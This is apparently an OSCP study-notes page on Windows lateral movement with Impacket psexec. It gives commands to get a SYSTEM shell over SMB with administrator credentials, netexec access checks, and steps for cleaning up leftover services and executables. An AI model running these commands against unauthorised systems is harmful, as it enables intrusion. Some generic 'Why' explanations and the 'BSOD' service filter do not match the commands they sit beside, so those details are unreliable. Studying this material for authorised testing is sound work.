# Windows - Lateral Movement - PsExec

**Windows lateral movement supplement**

Use this page when SMB access with a local administrator account is confirmed and a SYSTEM-level shell is needed. PsExec uploads a temporary service executable to ADMIN$, creates a Windows service, and starts it. The service runs as SYSTEM.

## Run this

> **Why:** This command gathers the windows lateral movement psexec evidence needed to decide which documented route applies next.
```bash
impacket-psexec $Domain/$Username:$Password@$BoxIP
```

Or via the aliased form if Impacket is installed that way:

> **Why:** This command gathers the windows lateral movement psexec evidence needed to decide which documented route applies next.
```bash
psexec.py $Domain/$Username:$Password@$BoxIP
```

## Example output

```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on $BoxIP.....
[*] Found writable share ADMIN$
[*] Uploading file RANDOMNAME.exe
[*] Opening SVCManager on $BoxIP.....
[*] Creating service XXXX on $BoxIP.....
[*] Starting service XXXX.....
[!] Press help for extra shell commands
C:\Windows\system32>
```

## What did you get?

- **Shell prompt returned:** run `whoami` immediately; `nt authority\\system` confirms SYSTEM.
- **Access denied on ADMIN$:** run `netexec smb $BoxIP -u $Username -p $Password --shares` and confirm the account has administrative share access.
- **Service manager error:** run `netexec smb $BoxIP -u $Username -p $Password` and recheck group membership if service control is denied.

> **Why:** This authenticated SMB or WinRM check validates the recovered credential and reveals whether the account has the requested access.
```bash
netexec smb $BoxIP -u $Username -p $Password
```

A `Pwn3d!` result confirms administrative execution access before running PsExec.

## Artifact verification

PsExec creates three things: a service executable in ADMIN$, a Windows service entry, and the running service process. On a clean exit it removes all three automatically. On a broken pipe exit (common if the shell crashes or you close the terminal) cleanup may not run.

After every PsExec session, verify cleanup from outside the shell:

> **Why:** This query tests the exposed directory or share interface for accounts, permissions, and readable data that determine the next route.
```bash
# Check for leftover services with a PsExec-style name (four random uppercase letters)
netexec smb $BoxIP -u $Username -p $Password -x "sc query type= all state= all | findstr /i BSOD"

# List files in ADMIN$ root to catch leftover executables
netexec smb $BoxIP -u $Username -p $Password --shares
smbclient //$BoxIP/ADMIN$ -U "$Domain/$Username%$Password" -c "ls *.exe"
```

If a leftover service or executable is found:

> **Why:** This query tests the exposed directory or share interface for accounts, permissions, and readable data that determine the next route.
```bash
# Delete the service
netexec smb $BoxIP -u $Username -p $Password -x "sc stop SERVICENAME & sc delete SERVICENAME"

# Delete the executable from ADMIN$
smbclient //$BoxIP/ADMIN$ -U "$Domain/$Username%$Password" -c "del FILENAME.exe"
```

## What did you get?

- **No .exe files listed and sc query returns no unknown services:** run `dir C:\\Windows\\Temp` and `sc query` to confirm cleanup is complete.
- **An .exe file or unknown service is present:** run the removal commands above, then run `dir C:\\Windows\\Temp` and `sc query $ServiceName` to verify absence.

## Gotcha

> [!warning] 💡
> A "broken pipe" error on exit is normal -- PsExec's cleanup can still succeed even after a pipe error. Always verify externally rather than assuming the session exited cleanly.

> [!warning] 💡
> PsExec requires ADMIN$ to be writable. If the share exists but access is denied, confirm the account is a local administrator, not just a standard domain account with a matching username.

## External Resources

- [HackTricks PsExec](https://book.hacktricks.xyz/windows-hardening/ntlm/psexec)
- [Impacket psexec.py source](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
## Seen in
- *(no write-up yet)*

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
